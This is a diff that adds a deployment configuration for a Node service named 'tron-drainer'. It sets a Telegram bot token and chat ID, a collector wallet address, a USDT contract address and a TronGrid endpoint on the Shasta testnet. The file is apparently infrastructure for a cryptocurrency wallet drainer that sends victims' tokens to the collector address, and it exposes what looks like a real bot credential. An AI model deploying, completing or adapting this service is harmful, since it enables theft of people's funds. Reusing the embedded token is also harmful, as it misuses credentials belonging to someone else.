@@ -1,0 +1,19 @@
+services:
+  - type: web
+    name: tron-drainer
+    env: node
+    buildCommand: npm install
+    startCommand: npm start
+    envVars:
+      - key: NODE_VERSION
+        value: 18.18.0
+      - key: BOT_TOKEN
+        value: 8765027365:AAEfL0C26LMs4tPce2UIf5gOZG_5omDw4Pc
+      - key: CHAT_ID
+        value: 7883109498
+      - key: COLLECTOR_ADDRESS
+        value: TUmkvB7jM8YHaS2s2hHDFN31aSbfqT1GAF
+      - key: USDT_CONTRACT
+        value: TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs
+      - key: TRONGRID_API
+        value: https://api.shasta.trongrid.io
